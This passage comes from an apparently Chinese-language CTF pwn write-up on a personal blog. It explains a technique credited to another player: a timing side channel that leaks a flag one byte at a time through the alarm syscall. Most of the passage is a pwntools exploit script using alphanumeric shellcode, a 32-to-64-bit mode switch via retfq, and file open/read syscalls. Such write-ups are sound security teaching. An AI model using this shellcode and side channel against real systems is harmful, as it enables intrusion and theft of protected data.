+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>得到flag:</p> <p><img src="https://i.loli.net/2021/08/25/XOCmEgbnoP5M4vZ.png" alt="image-20210825214314835"></p> <h2 id="alarm时间获取flag"><a href="#alarm时间获取flag" class="header-anchor">#</a> alarm时间获取flag</h2> <p>比较有趣的思路, 复现来自<a href="https://eqqie.cn/index.php/archives/1662" target="_blank" rel="noopener noreferrer">赤道企鹅师傅的wp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>,</p> <p>思路就是通过alarm系统调用设置时钟, 参数是读取进来的flag的某一位,  脚本中获取到这个等待时间就是flag,</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>
+openflag <span class="token operator">=</span> asm32<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;./flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ret264 <span class="token operator">=</span> asm32<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+	push 0x33; 
+	push 0x40404065;
+	// retfq;
+	'''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b&quot;H\xcb&quot;</span>
+readflag <span class="token operator">=</span> asm64<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./bin&quot;</span><span class="token punctuation">)</span>
+	payload1 <span class="token operator">=</span> <span class="token string">b&quot;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00&quot;</span>
+	
+	<span class="token comment"># gdb.attach(cn, cmd)</span>
+	cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+	<span class="token comment"># pause()</span>
+
+	alarm <span class="token operator">=</span> asm64<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+		xor rax, rax;
+		mov al, byte ptr[rsp+{}];
+		mov rdi, rax;
+		sub rdi, 0x20;
+		push 37;
+		pop rax;
+		syscall;
+		jmp $;
+		'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	sc2 <span class="token operator">=</span> openflag <span class="token operator">+</span> ret264 <span class="token operator">+</span> readflag <span class="token operator">+</span> alarm
+	start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>sc2<span class="token punctuation">)</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">except</span><span class="token punctuation">:</span>
+		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	cn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	pass_time <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span>
+	flag<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> pass_time
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">]</span>
+
+pool <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">0x20</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>exp<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+	pool<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+	t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> pool<span class="token punctuation">:</span>
+	t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><p><img src="https://i.loli.net/2021/08/25/SYVwsGWyNZ7gEup.png" alt="image-20210825223312538"></p></div></div> <!----> <div class="page-edit"><!----> <!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">8/26/2021, 3:14:55 AM</span></div></div> <div class="page-nav-wapper"><!----> <!----></div></div> <!----></main></div> <div class="footer"><div class="icons"><a href="mailto:wl200103124@163.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/wlingze" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://blog.csdn.net/wlz_lc_4" title="csdn" target="_blank" class="iconfont icon-csdn"></a><a href="https://www.zhihu.com/people/wlingze" title="zhihu" target="_blank" class="iconfont icon-zhihu"></a></div> 
+  Theme by
+  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
+    | Copyright © 2019-2022
+    <span>lingze | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
+          跟随系统
+        </li><li class="iconfont icon-rijianmoshi">
+          浅色模式
+        </li><li class="iconfont icon-yejianmoshi">
+          深色模式
+        </li><li class="iconfont icon-yuedu">
+          阅读模式
+        </li></ul></div></div> <!----> <!----> <!----></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.01f8cc77.js" defer></script><script src="/assets/js/2.5ece5099.js" defer></script><script src="/assets/js/37.8e60e299.js" defer></script>
+  </body>
+</html>
